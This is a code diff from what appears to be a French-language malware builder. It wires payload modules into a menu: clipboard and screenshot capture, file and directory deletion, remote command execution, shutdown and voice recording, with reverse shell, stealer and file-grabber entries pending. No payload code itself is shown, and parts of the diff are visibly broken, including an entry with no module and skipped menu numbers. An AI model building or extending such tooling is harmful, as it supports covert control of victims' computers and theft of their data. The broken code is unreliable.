@@ -6,15 +6,15 @@ from Option.modules.payload.dirlist import *
 #from Option.modules.payload.filegrab import file_grabber_module
 #from Option.modules.payload.keybcontrol import keyboard_controller_module
 from Option.modules.payload.networkinfo import *
-from Option.modules.payload.openurl import open_url_module
+from Option.modules.payload.openurl import *#eva
 #from Option.modules.payload.porthammer import port_hammer_module
 #from Option.modules.payload.processview import process_view_module
 #from Option.modules.payload.reversehttp import reverse_http_module
 #from Option.modules.payload.reverseshell import reverse_shell_module
 from Option.modules.payload.rmdir import *
 from Option.modules.payload.rmscript import *
-from Option.modules.payload.runcmd import runcmd_module
-from Option.modules.payload.shutdown import shutdown_module
+from Option.modules.payload.runcmd import *
+from Option.modules.payload.shutdown import *
 #from Option.modules.payload.steal import stealer_module
 from Option.modules.payload.voicerec import *
 from Option.modules.payload.wallpaper import *
@@ -62,7 +62,7 @@ Appuyez sur Entrée pour continuer...
     payloads = [
         ("Clipboard", clipboard_module),
         ("Screenshot", screenshot_module),
-        ("Directory listing", None),
+        ("Directory listing", directory_listing_module),
         ("File Grabber", None),
         ("Keyboard controller", None),
         ("Network info", None),
@@ -72,14 +72,13 @@ Appuyez sur Entrée pour continuer...
         ("Restart PC", None),
         ("Reverse HTTP", None),
         ("Reverse Shell", None),
-        ("Remove Directory", None),
-        ("Remove file", None),
+        ("Remove Directory", rmdir_module),
+        ("Remove file", rmscript),
         ("Run Command on terminal", runcmd_module),
         ("Shutdown", shutdown_module),
         ("Stealer", None),
         ("Voice record", None),
-        ("Change wallpaper", None),
-        ("Wifi SSiD", None),
+        ("Change wallpaper", ),
     ]
 
     captures = [
@@ -120,16 +119,15 @@ Appuyez sur Entrée pour continuer...
         7. Open url
         8. Port Hammer (en développement)
         9. Process View (en développement)  
-        10. Restart PC (en développement)
         11. Reverse HTTP (en développement)
         12. Reverse Shell (en développement)
         13. Remove Directory
-        14. Remove file (en développement)
+        14. Remove file 
         15. Run Command on terminal
         16. Stealer (en développement)
-        17. Voice record (en développement)
-        18. Change wallpaper    (en développement)
-        19. Wifi SSiD (en développement)
+        17. Voice record 
+        18. Change wallpaper    
+
 
     """)
             payload_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
